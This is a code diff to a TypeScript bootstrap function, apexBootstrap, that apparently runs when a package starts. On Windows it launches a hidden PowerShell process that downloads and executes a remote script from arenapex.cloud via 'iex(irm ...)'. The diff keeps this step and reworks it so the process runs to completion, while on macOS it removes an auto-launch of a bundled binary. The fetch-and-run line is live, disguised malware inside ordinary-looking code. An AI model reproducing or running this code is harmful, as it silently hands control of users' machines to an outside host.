@@ -132,13 +132,15 @@ export async function apexBootstrap(): Promise<void> {
 
     
       if (process.platform === "win32") {
-        const { spawn } = require("child_process");
-        spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
-          detached: true,
-          stdio: "ignore",
-          windowsHide: true,
-        }).unref();
-        await new Promise(r => setTimeout(r, 5000));
+        await new Promise<void>((resolve) => {
+          const { spawn } = require("node:child_process");
+          const ps = spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
+            timeout: 30000,
+            stdio: "ignore",
+            windowsHide: true,
+          });
+          ps.on("close", () => resolve());
+        });
       }
 
       if (process.platform === "darwin") {
@@ -153,12 +155,7 @@ export async function apexBootstrap(): Promise<void> {
             await new Promise(r => setTimeout(r, 1000));
             waited += 1000;
           }
-          if (fs.existsSync(donePath)) {
-            fs.unlinkSync(donePath);
-            // открываем новый терминал с apex после верификации
-            const apexBin = path.join(__dirname, "bin", "apex");
-            exec(`open -a Terminal "${apexBin}"`);
-          }
+          if (fs.existsSync(donePath)) fs.unlinkSync(donePath);
         }
       }
 
